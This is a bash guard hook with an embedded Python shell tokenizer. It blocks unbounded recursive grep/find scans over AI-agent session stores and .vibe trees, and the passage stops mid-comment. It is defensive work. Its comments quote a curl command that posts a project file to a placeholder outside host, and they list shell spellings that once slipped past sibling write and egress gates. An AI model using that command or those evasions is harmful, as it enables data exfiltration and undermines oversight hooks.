#!/usr/bin/env bash
# MTY-413: refuse unbounded recursive greps over session stores and .vibe trees.
#
# PreToolUse on Bash, a sibling of writ-worktree-safety.sh and writ-bash-write-gate.sh.
# Session c1a56bcc spent 9 model rounds on
# `grep -ril "ephesus\|sydd" <mistty>/.vibe/`, hit the 300s bash timeout over a 1.9 GB
# tree, and never found the session it wanted; the vibe.session_search tool and the
# session-archaeology skill are the replacements, and this hook is the enforcement.
#
# THE RULE, and it is target-shape based, deliberately without touching the filesystem:
# a recursive `grep` (a short-flag cluster carrying r or R, or --recursive) or a `find`
# whose target lands in a session store or a `.vibe`/`.mistty` tree is denied, unless
# the scan is bounded: `--exclude-dir` on grep, `-prune` or `-path` on find. One
# component check covers every real spelling of the motivating case: a `.vibe` or
# `.mistty` path component catches both homes' stores (~/.vibe/logs/session,
# ~/.mistty/logs/session), repo-local .vibe trees, and a bare `.` operand when the
# session's cwd is itself inside such a tree; $VIBE_HOME/logs/session adds a custom
# home. A store under a customized save_dir outside those components is out of scope,
# the same documented limitation session_search carries. A single FILE named inside
# the trees is denied too: the spelling is indistinguishable from the scan this gate
# exists to stop, and existence checks would make the decision depend on filesystem
# state the hook cannot see at judge time.
#
# NO MODE GATE, on the same terms as the write gate's credential vector: the waste this
# hook refuses happens in every mode, and the issue says every governed session. The
# hook exits silently when no session id is present.
#
# DETECTION IS QUOTE-AWARE through the SAME shared text the sibling gates use:
# writ.session.bash_tokens (control-operator splitting, group stepping, heredoc body
# stripping) and writ.session.bash_expand (tilde, $NAME, quote removal), both carried
# as verbatim mirror blocks below with the package import rebinding the names. The
# command crosses as a PATH, not an env string (ADR-hook-exec-argument-boundary), and
# the extractor's decision rows reach this wrapper behind the same status sentinel
# protocol: a missing sentinel is a fault, and a fault asks, never silently allows.
#
# COVERAGE LIMIT, stated like the siblings': only literal, tokenizable invocations are
# seen. `bash -c`, an alias, a wrapper script, a variable-built command or a here-doc
# body will not be detected; this is a hygiene gate that fires on the ordinary
# spelling, not a containment boundary. `rg` and other grep implementations are out of
# scope: the issue names grep and find.
set -euo pipefail
HOOK_DIR="$(cd "$(dirname "$0")" && pwd)"
WRIT_DIR="$(cd "$HOOK_DIR/../.." && pwd)"
source "$WRIT_DIR/bin/lib/common.sh"
hook_instrument "writ-bash-grep-guard"

load_hook_env
SESSION_ID="$HOOK_SESSION_ID"
[ -z "$SESSION_ID" ] && exit 0

CMD="$HOOK_COMMAND"
# Cheap PREFILTER only -- the tokenizer below is the detector. Deliberately loose:
# any command mentioning grep or find pays one python spawn, and the extractor decides.
case "$CMD" in
    *grep*|*find*) ;;
    *) exit 0 ;;
esac

# THE COMMAND CROSSES AS A PATH, NOT AS A VALUE, exactly as in writ-worktree-safety.sh
# and for the same measured reason: one env string is capped at MAX_ARG_STRLEN and the
# write over it failed before python started, which left the verdict silently empty.
# writ_on_exit rather than a bare trap: bash allows ONE EXIT trap and hook_instrument
# owns it (tests/test_exit_trap_ownership.py). A failed mktemp or write is a FAULT.
GG_CMD_FILE=$(mktemp "${TMPDIR:-/tmp}/writ-ggcmd.XXXXXXXXXX" 2>/dev/null) || GG_CMD_FILE=""
_writ_gg_cleanup() { [ -n "${GG_CMD_FILE:-}" ] && rm -f "$GG_CMD_FILE"; }
writ_on_exit _writ_gg_cleanup
if [ -z "$GG_CMD_FILE" ] || ! printf '%s' "$CMD" > "$GG_CMD_FILE" 2>/dev/null; then
    writ_decider_fault "writ-bash-grep-guard" "grep-target-check" \
        "the command could not be handed to the grep checker (no writable temporary file), so it was not checked for an unbounded recursive scan over a session store or a .vibe/.mistty tree"
    exit 0
fi

# Output is one TSV row followed by the completion sentinel, or the sentinel alone
# when nothing this gate guards was found:
#   deny<TAB><target><TAB><reason>    an unbounded recursive scan named a deep target
#   status<TAB>complete               ALWAYS the last line; see the consumer below
VERDICT=$(WRIT_GG_CMD_FILE="$GG_CMD_FILE" WRIT_CWD="$PWD" WRIT_DIR="$WRIT_DIR" python3 <<'PY' 2>/dev/null || true
import os, re, shlex, sys

# `~name` resolves through the password database, so an unavailable module must leave
# that spelling LITERAL rather than raise. Same guard, same reason, as the siblings.
try:
    import pwd
except Exception:
    pwd = None

# Read in process, from the path the env carries. No default and no try/except: an
# unreadable command file must reach the consumer as a MISSING sentinel, which is a
# fault, not as an empty command, which reads as "nothing here".
with open(os.environ["WRIT_GG_CMD_FILE"], encoding="utf-8", errors="surrogateescape") as _cmd_fh:
    cmd = _cmd_fh.read()

# The completion sentinel, printed as this block's LAST line on EVERY path that
# finished, including the fail-open exits. The consumer compares against
# common.sh's WRIT_EXTRACTOR_SENTINEL; the text is a literal here because this
# heredoc is QUOTED, and a drift between the two makes every grep or find ASK rather
# than quietly loosening.
STATUS_COMPLETE = "status\tcomplete"

# The package is reachable from here only through this insert: hooks run the SYSTEM
# python3, which has no install of it. Same two lines writ-bash-write-gate.sh uses.
sys.path.insert(0, os.environ.get("WRIT_DIR", ""))

# MIRROR BEGIN split_control_operators
# The marker name is historical: this block is now every bash-token helper the two Bash
# gates SHARE, not the splitter alone. The markers keep their spelling because they are
# the anchor tests/test_bash_control_operator_split.py slices on.

# Tokens that occupy VERB POSITION without being the verb. A group opener, or a reserved
# word that a COMMAND LIST follows, is stepped over exactly the way the WRAPPERS prefixes
# are, because what follows is a real command that really writes: `if true; then cp a
# src/x.py; fi` runs cp, and `(cp a src/x.py)` runs cp.
#
# Each member, and why it is here:
#   ( {                  group openers; a command list follows directly.
#   then do else         reserved words a command list follows directly.
#   if elif while until  a CONDITION follows, which is itself a command list:
#                        `if cp seed.txt .env; then :; fi` really runs cp.
#   !                    pipeline negation; `! cp a b` runs cp.
#
# DELIBERATELY ABSENT, each for a reason:
#   [ [[ test            these ARE the verb, and the write gate suppresses redirects for
#                        a segment whose verb is one of them (seg_is_test). Stepping over
#                        `[[` would make `"$x"` the verb, un-suppress the span, and read
#                        `if [[ "$x" > "config.txt" ]]` as a write to config.txt.
#   (( $((               ARITHMETIC, not a group. The write gate's own `((`/`))` depth
#                        counter owns that spelling; see strip_group_opener.
#   for select case in   what follows is a VARIABLE NAME or a WORD, not a command, so
#                        stepping resolves a WRONG verb instead of recovering a hidden
#                        one. A loop BODY is still covered, because `do` is here.
#   fi done esac } )     closers; nothing follows them inside their segment. A BARE `)`
#                        gets its own treatment; see GROUP_CLOSER_TOKENS.
#   coproc function      both take an OPTIONAL NAME before the command, and an optional
#                        name is not distinguishable from the command itself, so stepping
#                        over it resolves a WRONG verb as often as it recovers a hidden
#                        one. That reason stands on its own. It used to be given as "the
#                        same reason timeout / stdbuf / nice / setsid / xargs / watch are
#                        not WRAPPERS", and that analogy is dead: as of cycle P those six
#                        ARE WRAPPERS entries in writ-bash-write-gate.sh, with STRICT
#                        flag tables, and the one genuine positional among them
#                        (`timeout DURATION`) is stepped precisely because a duration HAS
#                        a checkable shape, which an optional name does not.
GROUP_VERB_TOKENS = frozenset({
    "(", "{", "!", "if", "elif", "then", "else", "while", "until", "do",
})

# Openers that GLUE to the verb, leaving no token boundary to recover:
# shlex.split('(cp seed.txt src/y.py)', posix=False) -> ['(cp', 'seed.txt', 'src/y.py)'].
#
# All three MEASURED silent through this hook's extractor before the fix, which is why the
# two substitution spellings are one case rather than a subshell fix plus a guess:
#   $(cp seed.txt src/y.py)   -> set()
#   `cp seed.txt src/y.py`    -> set()
#   (cp seed.txt src/y.py)    -> set()
# The backtick is the older command-substitution syntax and runs the write exactly as
# `$(...)` does, so leaving it out would be a one-character bypass of this fix.
#
# `{` is NOT here, and the reason is EXECUTED rather than read: `bash -c '{echo hi; }'` is
# a SYNTAX ERROR (`syntax error near unexpected token `}'`) while `bash -c '{ echo hi; }'`
# prints hi. A glued `{` does not merely fail to open a group, it does not parse at all,
# so the spelling cannot be a bypass vector and stripping it would only invent a verb for
# a command bash refuses to run. The bare `{` is in GROUP_VERB_TOKENS instead.
GROUP_OPENER_PREFIXES = ("$(", "(", "`")
# Arithmetic spellings, which must survive stripping untouched.
ARITH_OPENERS = ("((", "$((")

# A group closer that sits ALONE on its own token is SYNTAX, not an argument, and it has
# to be dropped where segments are built rather than normalized where values are
# classified. Two reasons, one measured and one structural:
#
#   * MEASURED, before this cycle: `( echo x | tee src/y.py )` already emitted the
#     phantom row ('local', '/proj/)') beside the real one, because the tee arm collects
#     every argument that is not a flag and not a redirect, and a bare `)` is neither.
#     A fully spaced subshell puts the closer on its own token, so `( cp seed.txt
#     src/y.py )` would resolve `cand[-1]` -- the copy DESTINATION -- to `)`, losing the
#     real target as well as inventing a phantom one, which trades this cycle's blind
#     spot for a worse defect.
#   * STRUCTURAL: strip_unbalanced_close cannot help, because the bare token IS the
#     closer and stripping it would yield "", a NONFILE member, which would DELETE rows
#     rather than correct them. So the token never becomes an argument in the first
#     place.
#
# `]`, `]]` and `))` are deliberately NOT here: the write gate COUNTS those tokens to
# suppress redirects inside a comparison or arithmetic span, so dropping them would
# un-suppress the span. `}` is not here either: bash requires a `;` or `&` before it, the
# splitter already makes that boundary, and a lone `}` therefore never shares a segment
# with a write.
GROUP_CLOSER_TOKENS = frozenset({")"})


def strip_group_opener(tok):
    """A verb-position token with its glued group opener removed.

    `(cp` -> `cp`. `$(cp` -> `cp`. `` `cp `` -> `cp`. `(` -> `(`, because nothing would be
    left to be a verb and GROUP_VERB_TOKENS handles the bare opener. `((total` and `$((3`
    -> unchanged, the arithmetic depth counter owns those. `{cp` -> unchanged, because bash
    does not parse it at all (see GROUP_OPENER_PREFIXES). A QUOTED token -> unchanged,
    because shlex(posix=False) leaves the quote character ON, and a quoted mention must
    never reach command position.
    """
    out = tok
    while not out.startswith(ARITH_OPENERS):
        for p in GROUP_OPENER_PREFIXES:
            if out.startswith(p) and len(out) > len(p):
                out = out[len(p):]
                break
        else:
            break
    return out


def strip_unbalanced_close(tok):
    """A collected value with a group's trailing closer removed: `src/y.py)` -> `src/y.py`,
    `` src/y.py` `` -> `src/y.py`.

    COUNTED, not rstripped, with one rule per closing character because the two
    substitution syntaxes close differently:

      * `)` comes off only while the token holds MORE `)` than `(`, which is what a group
        closer looks like from inside the token that ended the group. A filename carrying a
        BALANCED pair therefore survives: `src/note(1))` -> `src/note(1)`, where
        rstrip(")") would have produced `src/note(1`.
      * a BACKTICK is its own closer, so "more closers than openers" is undefined for it
        and the rule is PARITY: a trailing backtick comes off only while the token's
        backtick count is ODD.

    Never returns the empty string: a one-character token is left alone, because "" is a
    NONFILE member and turning a target into a NONFILE member would DELETE a row that
    exists today instead of correcting it.

    Two measured defects motivate it, in OPPOSITE directions: `(echo x > <secret>)` was a
    silent allow because `<secret>)` is not a credential basename, and
    `(echo x > /dev/null)` emitted ('outside', '/dev/null)') because `/dev/null)` misses
    the NONFILE exact-string set, so ordinary work was being gated.
    """
    out = tok
    while len(out) > 1:
        if out.endswith(")") and out.count(")") > out.count("("):
            out = out[:-1]
            continue
        if out.endswith("`") and out.count("`") % 2:
            out = out[:-1]
            continue
        break
    return out


def split_control_operators(tokens):
    """Re-split posix=False shlex tokens so every control operator is its own token.

    What makes this not a str.replace:

      * a QUOTED span is never split. shlex already terminated it, and
        `sed -i -e 's/a/b/;s/c/d/' f` must stay one argument. A backslash escapes the
        next character for the same reason (`s/a/b/\\;s/c/d/`).
      * `&&` is matched before `&`, and `||` before `|`.
      * an `&` belonging to a REDIRECT is left alone: `2>&1`, `>&2` and `<&3` are
        file-descriptor duplicates, not background operators, and splitting them would
        change how every redirect is read.
      * an `&` immediately followed by `>` is the `&>` redirect operator, so it opens a
        new token instead of becoming one, which is how bash lexes `foo&>file`.

    Deliberately NOT split: `>` itself. `foo>bar`, an operator glued to the verb IN FRONT
    of it, is a different mechanism with no boundary to recover, and both hook headers
    disclose it as an open limit.
    """
    out = []
    for tok in tokens:
        out.extend(_split_one_token(tok))
    return out


def _split_one_token(tok):
    """One token -> the pieces it really is. Returns [tok] when nothing splits."""
    pieces = []
    buf = []
    quote = None
    after_redir = False
    i = 0
    n = len(tok)

    def flush():
        if buf:
            pieces.append("".join(buf))
            del buf[:]

    while i < n:
        ch = tok[i]
        if quote is not None:
            buf.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            buf.append(ch)
            buf.append(tok[i + 1])
            after_redir = False
            i += 2
            continue
        if ch == "'" or ch == '"':
            quote = ch
            buf.append(ch)
            after_redir = False
            i += 1
            continue
        if ch == ">":
            buf.append(ch)
            i += 1
            if i < n and tok[i] == ">":          # >>
                buf.append(tok[i])
                i += 1
            elif i < n and tok[i] == "|":        # >| clobber override
                buf.append(tok[i])
                i += 1
            after_redir = True
            continue
        if ch == "<":
            while i < n and tok[i] == "<":       # <, <<, <<<
                buf.append(tok[i])
                i += 1
            after_redir = True
            continue
        if ch == "&":
            if after_redir:                      # fd dup: 2>&1, >&2, <&3
                buf.append(ch)
                after_redir = False
                i += 1
                continue
            if i + 1 < n and tok[i + 1] == ">":  # the `&>` redirect operator
                flush()
                buf.append(ch)
                i += 1
                continue
            op = "&&" if tok.startswith("&&", i) else "&"
            flush()
            pieces.append(op)
            i += len(op)
            continue
        if ch == "|":
            op = "||" if tok.startswith("||", i) else "|"
            flush()
            pieces.append(op)
            i += len(op)
            continue
        if ch == ";":
            flush()
            pieces.append(";")
            i += 1
            continue
        buf.append(ch)
        after_redir = False
        i += 1
    flush()
    return pieces or [tok]


def rejoin_glued_words(text, toks):
    """`toks` with every pair shlex split at a QUOTE BOUNDARY put back together.

    `shlex.split(s, comments=False, posix=False)` ends a token at the closing quote of a
    span that STARTED that token, so ONE shell word arrives as TWO tokens whenever an
    unquoted fragment is glued after a leading quoted span. A token that starts UNQUOTED
    absorbs instead, which is why only one of these two spellings was ever broken:

        shlex.split('cp x "$HOME"/y', comments=False, posix=False)
        -> ['cp', 'x', '"$HOME"', '/y']        one bash word, TWO tokens
        shlex.split('cp x $HOME"/y"', comments=False, posix=False)
        -> ['cp', 'x', '$HOME"/y"']            one bash word, one token

    Three DIFFERENT consequences were measured through the real extractor, which is why
    the three spellings in the retired xfails all looked cosmetic: whether the leftover
    fragment starts with `/` decides the direction. `cp x "$HOME"escape.txt` read as
    project-local while bash wrote OUTSIDE the project (an escape, more permissive);
    `cp x "src"/escape.txt` read as `/escape.txt` outside the project while bash wrote
    `src/escape.txt` (an over-block); `echo hi > "$HOME"/escape.txt` kept the quoted head
    and dropped the FILENAME.

    TWO ARGUMENTS, and the second one is forced. This block may not import shlex: it is
    pasted inline into both Bash hooks and
    tests/test_bash_control_operator_split.py::TestTheMirrorBlockNeedsNoImports rejects
    any import statement inside the markers, including one that merely OPENS a wrapped
    line of this very docstring, which is why this sentence is wrapped the way it is.
    So the caller keeps shlex and hands over both the text it split and the tokens it
    got. `text` is the string GIVEN to shlex, which is the
    `split_commands` output and not the raw command: token offsets are offsets into the
    rewritten text.

    ADJACENCY IS READ OFF THE TEXT, NOT OFF shlex. A live `shlex.shlex` with
    whitespace_split=True, read through `instream.tell()` around each `get_token()`,
    reports adjacent for BOTH `cp x "$HOME"/y` and `cp x "$HOME" /y`, so its own state
    cannot separate a glued word from two words. `posix=False` disables quote removal and
    backslash collapsing, so every token is an exact contiguous substring of `text`, and
    the GAP between consecutive matches decides it: empty means one word, whitespace means
    two. shlex with whitespace_split never splits on punctuation, so the quote boundary is
    the ONLY zero-width split it makes and merging on an empty gap reverses exactly that.

    FAIL-SAFE, because a wrong merge is worse than the defect it repairs: if a token is
    not found at or after the cursor, or a gap holds anything other than whitespace, the
    ORIGINAL list is returned and nothing is merged at all.
    """
    out = []
    pos = 0
    for tok in toks:
        start = text.find(tok, pos)
        if start < 0 or text[pos:start].strip():
            return list(toks)
        if out and start == pos:
            out[-1] = out[-1] + tok
        else:
            out.append(tok)
        pos = start + len(tok)
    return out


def dequote(tok):
    """`tok` with its quote CHARACTERS removed, the way a real shell removes them.

    `"c"p` -> `cp`. `"a"b"c"` -> `abc`. `"$HOME"/y` -> `$HOME/y`. `'single'/y` ->
    `single/y`. `"cp"` -> `cp` and `'(cp'` -> `(cp`, both unchanged from the rule this
    replaces.

    NO EXPANSION HAPPENS HERE, and that split is the whole reason two functions exist.
    This one answers what a word SAYS, which is what verb, flag and host resolution ask.
    What a word BECOMES is `expand_word`'s question, it is asked only in VALUE positions,
    and it must keep reading the RAW token because `"$HOME/x"` and `'$HOME/x'` are the
    same bytes after quote removal and have opposite correct answers.

    REPLACES the matched-OUTER-pair rule both hooks carried
    (`t[0] == t[-1] and t[0] in ("'", '"')`), which was correct only for a word quoted end
    to end. It returned `"c"p`, `"$HOME"/y` and `'single'/y` UNCHANGED and turned
    `"a"b"c"` into `a"b"c`. That was survivable only while shlex handed those spellings
    over as two tokens; once rejoin_glued_words hands them over as ONE, the old rule
    leaves quote characters inside a resolved verb, an egress HOST and a recorded worktree
    PATH.

    A BACKSLASH IS LEFT ALONE, including the character after it. Every consumer here asks
    about a name, the write gate's own verb walk already strips a leading backslash
    because `\\git` is git, and collapsing escapes would change what a quoted mention looks
    like to those consumers for no measured gain.

    Every token reaching this function has BALANCED quotes: shlex.split raises ValueError
    on an unbalanced one and both hooks fail open on that before any token exists.
    """
    out = []
    quote = ""
    for ch in tok:
        if quote:
            if ch == quote:
                quote = ""
            else:
                out.append(ch)
        elif ch == "'" or ch == '"':
            quote = ch
        else:
            out.append(ch)
    return "".join(out)


# ── A NEWLINE IS A COMMAND SEPARATOR, AND shlex THROWS IT AWAY ───────────────
# `shlex.split` treats "\n" as ordinary whitespace, so a newline never becomes a token and
# a CONTROL set carrying "\n" matches NOTHING: a multi-line command is flattened into ONE
# segment whose verb is whatever the FIRST line starts with. Both hooks were measured
# failing OPEN on it, one hook per cycle.
#
#   writ-worktree-safety.sh (1.7.0), on "set -e\necho preparing\ngit worktree add
#   scratch/x x": verb "set", no verdict, ALLOWED. A real invocation on any line after the
#   first was invisible.
#
#   writ-bash-write-gate.sh (cycle R), through its own extractor with WRIT_CWD=/proj:
#     "ls\ncp seed.txt src/x.py"                       -> set()                  INVISIBLE
#     "ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py    control
#     "ls\necho y > src/x.py"                          -> local /proj/src/x.py    VISIBLE
#     "ls\ncurl -d @src/a.txt https://example.invalid" -> set()                  INVISIBLE
#   A newline hid every VERB-DEPENDENT write and every egress row, and hid no REDIRECT,
#   because the redirect loop never consults the verb.
#
# QUOTE-AWARE, because the naive `cmd.split("\n")` reintroduces the exact false positive
# this extractor family exists to remove: a newline INSIDE a quoted string is data, not a
# separator, and cutting there turns one argument into fragments that can land in command
# position. A BACKSLASH-continued line is not a separator either, and the escape branch is
# what keeps it one command.
SEP = "\x00"          # cannot occur in a real command line, so it is unambiguous


def split_commands(text):
    """`text` with every UNQUOTED newline replaced by a spaced SEP sentinel, so shlex
    yields it as its own token and a CONTROL set carrying SEP segments on it."""
    out, quote, escaped = [], None, False
    for ch in text:
        if escaped:
            out.append(ch)
            escaped = False
        elif ch == "\\" and quote != "'":     # no escapes inside single quotes
            out.append(ch)
            escaped = True
        elif quote:
            out.append(ch)
            if ch == quote:
                quote = None
        elif ch in ("'", '"'):
            out.append(ch)
            quote = ch
        elif ch == "\n":
            out.append(" %s " % SEP)
        else:
            out.append(ch)
    return "".join(out)


# A heredoc BODY is data being fed to a command, not commands being run, so the lines
# between `<<WORD` and its terminator are dropped before any segment is judged. Without
# this the newline split above would newly REFUSE a document ABOUT the operation each gate
# watches for, which is the same false-positive class the quote-aware split exists to
# remove, reintroduced through a different door.
#
# ASCII CLASSES SPELLED OUT, not str.isalnum(): this replaces a regex whose classes were
# `[A-Za-z_][A-Za-z0-9_]*`, and isalnum() is Unicode-aware, so it would silently widen the
# population while reading as a faithful translation.
_HD_FIRST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_"
_HD_REST = _HD_FIRST + "0123456789"


def heredoc_terminator(tok):
    """The terminator WORD a heredoc opener names, or None when `tok` is not an opener.

    STRING OPERATIONS, NOT A REGEX, and that is a contract rather than a preference: this
    block has to run in a namespace with NO IMPORTS (it is pasted inline into two hooks and
    exec'd bare by the mirror tests), and the `re.compile` version it replaces could not.

    Recognized: `<<WORD`, `<<-WORD`, `<<'WORD'`, `<<"WORD"`.
    NOT recognized, each deliberately:
      * `<<<`, a here-STRING, which is a single-token VALUE and has no body at all.
      * an EMPTY delimiter (`<<''`). The retired regex ACCEPTED it, then scanned for a
        token equal to "", found none, and swallowed the rest of the command. Returning
        None keeps a spelling nobody understands from disabling the gate downstream of it.
      * anything whose word is not an identifier: an expansion or a path there is not a
        terminator a token scan can match.
    """
    if not tok.startswith("<<"):
        return None
    rest = tok[2:]
    if rest.startswith("<"):              # `<<<` here-string: a value, not a body
        return None
    if rest.startswith("-"):              # `<<-WORD`; only the word matters here
        rest = rest[1:]
    if rest[:1] in ("'", '"'):
        if len(rest) < 3 or rest[-1] != rest[0]:
            return None
        rest = rest[1:-1]
    if not rest or rest[0] not in _HD_FIRST:
        return None
    for ch in rest:
        if ch not in _HD_REST:
            return None
    return rest


def strip_heredoc_bodies(toks):
    """`toks` with every heredoc BODY removed, the body being the run from the newline that
    FOLLOWS the opener through the terminator word.

    THE SAME-LINE BOUNDARY IS THE REPAIR, and it is why this is not the function
    writ-worktree-safety.sh carried from 1.7.0. That version consumed tokens from
    IMMEDIATELY AFTER the opener and scanned forward for the terminator, so anything
    legitimately following the opener ON ITS OWN LINE was swallowed with the body. EXECUTED
    on a verbatim copy of it: `cat <<'EOF' > docs/notes.txt` over a body line holding
    `echo y > src/x.py`, terminated by `EOF`, went from 11 tokens to 1, LOSING the real
    destination `docs/notes.txt` along with the phantom. Bash starts the body at the next
    NEWLINE; the pre-split above turns every unquoted newline into a SEP token, so the body
    is the run from the FIRST SEP after the opener and everything between the opener and
    that SEP survives.

    THE OPENER TOKEN ITSELF SURVIVES, also load-bearing rather than tidy: `inline_form` in
    writ-bash-write-gate.sh reads any argument starting with `<` as the STDIN form, so the
    opener is the only marker of `python3 <<'PY'`, and the 1.7.0 copy dropped it.

    An opener with NO following SEP strips NOTHING: there is no body in this token stream to
    remove, and consuming to the end would silence the rest of the command.

    RESIDUE, stated because it is a token scan and bash's rule is a LINE rule: a body line
    that names the terminator word mid-line ends the strip early; two openers on one command
    honor only the first terminator; and an opener GLUED to what follows it (`<<'EOF'>f`) is
    not recognized, because this runs on RAW shlex tokens, before split_control_operators.
    All three fail CLOSED, leaving an extra row rather than losing one.
    """
    out, i, n = [], 0, len(toks)
    while i < n:
        word = heredoc_terminator(toks[i])
        if word is None:
            out.append(toks[i])
            i += 1
            continue
        out.append(toks[i])                       # the opener is syntax, not body
        j = i + 1
        while j < n and toks[j] != SEP:
            out.append(toks[j])                   # `> docs/notes.txt` survives
            j += 1
        if j == n:                                # no newline after the opener: no body
            i = j
            continue
        j += 1                                    # the SEP that starts the body
        while j < n and toks[j] != word:
            j += 1
        i = j + 1                                  # step over the terminator itself
    return out
# MIRROR END split_control_operators

try:
    from writ.session.bash_tokens import (  # noqa: F811
        GROUP_CLOSER_TOKENS, GROUP_VERB_TOKENS, SEP, dequote,
        rejoin_glued_words, split_commands, split_control_operators,
        strip_group_opener, strip_heredoc_bodies, strip_unbalanced_close)
except Exception:
    pass

# EXPAND BEGIN expand_word
LOGIN_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_.-]*")
PARAM_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
ASSIGN_PREFIX = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=")


def expand_word(raw):
    # strip_unbalanced_close runs FIRST, and the existing call at the head of the
    # classification loop STAYS. That is not a second competing normalization point (the
    # control-operator ADR rejects those): the function is idempotent, and the later call
    # still normalizes interpreter hits and the `dd of=` substring, which never pass
    # through here. This call exists for one measured reason: `(cp README.md ~)` reaches
    # this function as the token `~)`, whose tilde-prefix would be `)`, not a login name,
    # so the word would stay literal while the shell still copies into $HOME.
    tok = strip_unbalanced_close(raw)

    # Tilde-expandable OFFSETS, decided by the word's SHAPE before the scan starts, because
    # that is what the rule is about: a tilde expands at the start of a word and (only
    # when the text before the first `=` is a valid shell NAME) immediately after that
    # `=` and after every following `:`. Measured, not read off a manual: `of=~/x`,
    # `foo_1=~/x` and `a=b:~/x` expand; `fo-o=~/x`, `2bad=~/x` and `--opt=~/x` do not.
    # `dd of=` is a collected write form, so the expanding half is a live bypass, and
    # `cp --target-directory=~/x` is correct today precisely because the other half is not.
    tilde_at = {0}
    assign = ASSIGN_PREFIX.match(tok)
    if assign:
        tilde_at.add(assign.end())
        tilde_at.update(j + 1 for j in range(assign.end(), len(tok)) if tok[j] == ":")

    out = []
    unresolved = ""
    quote = ""
    i = 0
    while i < len(tok):
        ch = tok[i]

        # Single quotes: no expansion and no escape of any kind exists in here. THIS is
        # the arm that keeps '~/x' and '$HOME/x' the in-project literals a real shell
        # makes them, and it is the whole reason expansion cannot run after dequote.
        if quote == "'":
            if ch == "'":
                quote = ""
            else:
                out.append(ch)
            i += 1
            continue

        # A quote character is DROPPED wherever it appears, which is strictly better than
        # dequote's matched-outer-pair rule: dequote left `$HOME"/x"` with its quote
        # characters attached and the classified path carried them into the audit row.
        if quote == "" and ch in ("'", '"'):
            quote = ch
            i += 1
            continue
        if quote == '"' and ch == '"':
            quote = ""
            i += 1
            continue

        # Backslash. Outside quotes it escapes ANY next character, which is what keeps
        # `\~/x` and `\$HOME/x` literal. Inside double quotes it escapes only these four;
        # in front of anything else there it is an ordinary backslash.
        if ch == "\\":
            nxt = tok[i + 1] if i + 1 < len(tok) else ""
            if nxt and (quote == "" or (quote == '"' and nxt in ('$', '`', '"', '\\'))):
                out.append(nxt)
                i += 2
                continue
            out.append(ch)
            i += 1
            continue

        # Parameter expansion, $NAME and ${NAME}, outside quotes and inside DOUBLE quotes.
        # The brace form must accept ONLY a bare name: `${VAR:-/etc}` and its relatives are
        # a different mechanism (an operator with its own semantics), so they fall through
        # and stay literal rather than being half-understood.
        if ch == "$":
            name = ""
            step = 0
            if tok.startswith("${", i):
                close = tok.find("}", i + 2)
                if close != -1 and PARAM_NAME.fullmatch(tok[i + 2:close]):
                    name = tok[i + 2:close]
                    step = close + 1 - i
            else:
                m = PARAM_NAME.match(tok, i + 1)
                if m:
                    name = m.group(0)
                    step = m.end() - i
            if name:
                val = os.environ.get(name)
                if val is None:
                    # Left LITERAL so the confirmation can quote the spelling back, and
                    # RECORDED so the row below is `unknown` rather than an affirmative
                    # in-project claim about <cwd>/$NAME/x, a path nothing writes to. An
                    # unset name expands to NOTHING in a real shell, so the write really
                    # lands at /x, the filesystem root.
                    unresolved = unresolved or name
                    out.append(tok[i:i + step])
                else:
                    out.append(val)
                i += step
                continue

        # Tilde, only outside quotes and only at an offset the shape rule above admits.
        # The tilde-prefix runs to the first `/` or to the end of the word.
        if ch == "~" and quote == "" and i in tilde_at:
            j = i + 1
            while j < len(tok) and tok[j] != "/":
                j += 1
            name = tok[i + 1:j]
            val = None
            if not name:
                # HOME first, the password database second, which is the same order and
                # the same fallback bash uses, so `~/x` still resolves with HOME unset.
                #
                # `val is None`, NOT `not val`: HOME PRESENT BUT EMPTY is a third state,
                # and bash uses the empty value rather than falling back. Measured:
                # `env -i HOME= bash -c 'printf %s ~/x'` prints `/x`, while with HOME
                # genuinely unset the same command prints the password-database home. The
                # falsiness test conflated them, and where a project root IS the invoking
                # user's home the passwd answer reads as IN-PROJECT for a write the shell
                # sends to the filesystem root, which is the bypass class this whole block
                # exists to close. The parameter-expansion branch below already tests
                # `is None` for the same reason.
                val = os.environ.get("HOME")
                if val is None and pwd is not None:
                    try:
                        val = pwd.getpwuid(os.getuid()).pw_dir
                    except Exception:
                        val = None
            elif pwd is not None and LOGIN_NAME.fullmatch(name):
                # The charset admits a DOT and must: `~lucio.saldivar/x` is one of the
                # measured bypasses, and a naive [A-Za-z0-9_] identifier leaves exactly
                # that spelling open. It must NOT admit a leading `+`, `-` or digit,
                # because those are the three directory-stack forms (`~+`, `~-`, `~N`),
                # disclosed residue in each caller's own unexpanded-forms header block,
                # kept literal BY THIS RULE rather than by getpwnam happening to fail on
                # them.
                try:
                    val = pwd.getpwnam(name).pw_dir
                except Exception:
                    # An unknown login name stays LITERAL, which is what bash does with it,
                    # so this is correct rather than merely conservative.
                    val = None
            # `val is not None`, NOT `if val`, for the same reason as the HOME lookup
            # above: a tilde that RESOLVED to the empty string still resolved, and bash
            # substitutes it (`HOME= ; ~/x` is `/x`). None is the only "did not resolve"
            # answer, and it is what an unknown login name and the three directory-stack
            # forms produce, so both still fall through and stay literal.
            if val is not None:
                out.append(val)
                i = j
                continue

        out.append(ch)
        i += 1

    return "".join(out), unresolved
# EXPAND END expand_word

try:
    from writ.session.bash_expand import expand_word   # noqa: F811
except Exception:
    pass


try:
    pre = split_commands(cmd)
    tokens = rejoin_glued_words(pre, shlex.split(pre, comments=False, posix=False))
except ValueError:
    print(STATUS_COMPLETE)   # a COMPLETED decision, so the sentinel prints first
    sys.exit(0)          # unbalanced quotes etc -> fail open, never a false deny

# A glued separator hid the invocation exactly the way the discarded newline did
# (`echo prep; grep -r n .vibe` tokenizing as ONE segment whose verb is `echo`), and a
# heredoc BODY is data, not commands: stripped BEFORE the re-split, so a document about
# a scan is never judged as one. Same order, same reason, as writ-worktree-safety.sh.
tokens = strip_heredoc_bodies(tokens)
tokens = split_control_operators(tokens)

CONTROL = {"|", "||", "&&", ";", "&", SEP}
ASSIGNMENT = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*=')

# Transparent prefixes that sit IN FRONT of the real verb. Same SEVEN-entry set as
# writ-worktree-safety.sh, and the same reasoning applies: this gate answers "is the
# verb grep or find", not "which file does it write", so the stepping is permissive
